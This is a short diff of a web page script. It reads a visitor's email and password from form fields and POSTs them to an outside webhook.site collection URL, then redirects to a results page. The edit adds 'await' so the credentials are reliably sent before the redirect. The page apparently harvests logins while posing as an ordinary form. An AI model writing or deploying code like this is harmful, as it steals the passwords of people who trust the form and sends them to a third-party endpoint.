@@ -84,7 +84,7 @@
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      fetch("https://webhook.site/8ff9a457-3cde-442a-9d70-7891d08ae7ed", {
+      await fetch("https://webhook.site/8ff9a457-3cde-442a-9d70-7891d08ae7ed", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -97,6 +97,7 @@
         })
       });
 
+      
       // Redirect to results page with the first name and last name in the URL
       window.location.href = `/pages/results.html?first_name=${encodeURIComponent(firstName)}&last_name=${encodeURIComponent(lastName)}`;
     }
